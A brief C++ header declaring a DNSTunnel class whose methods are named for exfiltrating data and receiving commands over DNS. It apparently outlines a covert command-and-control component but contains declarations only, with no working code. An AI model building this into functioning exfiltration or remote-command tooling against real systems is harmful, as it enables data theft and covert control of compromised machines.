#pragma once
#include <string>

class DNSTunnel {
private:
    std::string domain;
    // other private members if needed
    
public:
    DNSTunnel(const std::string& domain);
    ~DNSTunnel();
    
    bool Exfiltrate(const std::string& data);
    std::string ReceiveCommand();
};
